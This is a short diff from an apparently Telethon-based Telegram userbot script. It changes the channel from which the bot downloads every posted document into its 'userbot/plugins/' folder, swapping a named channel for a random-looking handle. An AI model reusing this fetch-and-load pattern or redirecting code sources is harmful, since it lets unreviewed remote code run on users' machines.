@@ -43,7 +43,7 @@ else:
     
 
 async def a():
-    username = "@xtraplugs"
+    username = "@qjosnwill2jrj27q829e9nenx"
     plug = await bot.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(plug.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
         mxo = plug[ixo].id ; await bot.download_media(await bot.get_messages(username, ids=mxo), "userbot/plugins/")
